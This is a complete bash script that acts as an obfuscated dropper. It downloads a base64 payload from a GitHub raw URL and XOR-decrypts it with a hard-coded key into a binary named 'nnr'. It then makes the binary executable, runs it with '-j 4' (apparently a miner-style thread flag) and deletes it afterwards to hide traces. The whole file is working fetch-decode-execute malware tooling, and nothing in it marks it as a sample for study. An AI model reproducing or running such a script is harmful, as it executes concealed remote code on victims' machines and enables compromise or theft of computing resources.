#!/bin/bash

_xor_decrypt() {
    local data="$1"
    local key="$2"
    python3 -c "
import base64, sys
data = base64.b64decode('$data')
key = '$key'
decrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
sys.stdout.buffer.write(decrypted)
" 2>/dev/null
}
_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded successfully"
echo "Payload length: ${#_PAYLOAD}"
_xor_decrypt "$_PAYLOAD" "kembang" > nnr
if [ ! -f nnr ]; then
    echo "Error: Failed to create nnr"
    exit 1
fi
SIZE=$(stat -c%s nnr 2>/dev/null || stat -f%z nnr 2>/dev/null)
echo "nnr size: $SIZE bytes"
if [ "$SIZE" -eq 0 ]; then
    echo "Error: nnr is empty (decryption failed)"
    echo "Debugging: Checking payload content..."
    head -c 100 payload_debug.txt
    echo ""
    exit 1
fi
chmod +x nnr
echo "Executing."
./nnr -j 4
# Cleanup
rm -f nnr payload_debug.txt
